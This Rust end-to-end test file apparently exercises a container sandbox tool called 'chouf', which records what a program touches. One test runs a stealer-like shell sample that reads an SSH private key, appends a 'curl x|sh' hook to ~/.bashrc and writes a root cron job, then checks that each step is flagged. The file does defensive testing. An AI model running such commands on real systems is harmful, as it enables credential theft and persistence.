//! Real runs through podman. Needs rootless podman and pulls ubuntu:24.04 once: `cargo test -- --include-ignored`.

use std::path::PathBuf;
use std::process::Command;

static RUN: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

fn chouf(args: &[&str]) -> (i32, String, serde_json::Value) {
    // tests run in parallel: each run gets its own data directory
    let n = RUN.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
    let data = std::env::temp_dir().join(format!("chouf-e2e-{}-{n}", std::process::id()));
    let out = Command::new(env!("CARGO_BIN_EXE_chouf"))
        .args(args)
        .env("XDG_DATA_HOME", &data)
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout).to_string();
    let session = text
        .lines()
        .find_map(|l| l.strip_prefix("session: "))
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            panic!(
                "no session:\n{text}\n{}",
                String::from_utf8_lossy(&out.stderr)
            )
        });
    let json =
        serde_json::from_slice(&std::fs::read(session.join("report.json")).unwrap()).unwrap();
    let _ = std::fs::remove_dir_all(data);
    (out.status.code().unwrap(), text, json)
}

fn has(j: &serde_json::Value, kind: &str, path: &str) -> bool {
    j["findings"]
        .as_array()
        .unwrap()
        .iter()
        .any(|f| f["kind"] == kind && f["path"] == path)
}

#[test]
#[ignore]
fn a_stealer_is_caught() {
    let script = "cat ~/.ssh/id_ed25519 > /dev/null; echo 'curl x|sh' >> ~/.bashrc; \
                  echo '* * * * * root /x' > /etc/cron.d/u; echo ok > /usr/local/bin/tool";
    let (code, text, j) = chouf(&["run", "--no-net", "--", "sh", "-c", script]);
    assert_eq!(code, 1, "{text}");
    assert!(has(&j, "secret", "~/.ssh/id_ed25519"), "{text}");
    assert!(has(&j, "persistence", "~/.bashrc"), "{text}");
    assert!(has(&j, "persistence", "/etc/cron.d/u"), "{text}");
    assert!(has(&j, "other", "/usr/local/bin/tool"), "{text}");
    assert_eq!(
        j["findings"].as_array().unwrap().len(),
        4,
        "only what it did:\n{text}"
    );
    assert_eq!(j["exit_code"], 0);
    assert_eq!(j["token"].as_str().unwrap().len(), 16);
}

#[test]
#[ignore]
fn a_quiet_program_is_clean() {
    let (code, text, j) = chouf(&[
        "run",
        "--no-net",
        "--",
        "sh",
        "-c",
        "ls / > /dev/null; cat /etc/os-release; echo hi > /tmp/scratch",
    ]);
    assert_eq!(code, 0, "{text}");
    let f = j["findings"].as_array().unwrap();
    assert!(f.iter().all(|f| f["kind"] == "other"), "{text}");
    assert!(text.contains("/tmp/scratch"));
}

#[test]
#[ignore]
fn the_time_limit_holds() {
    let t = std::time::Instant::now();
    let (_, text, j) = chouf(&["run", "--no-net", "--timeout", "2", "--", "sleep", "60"]);
    assert_eq!(j["timed_out"], true, "{text}");
    assert!(j["exit_code"].is_null());
    assert!(t.elapsed().as_secs() < 30);
}
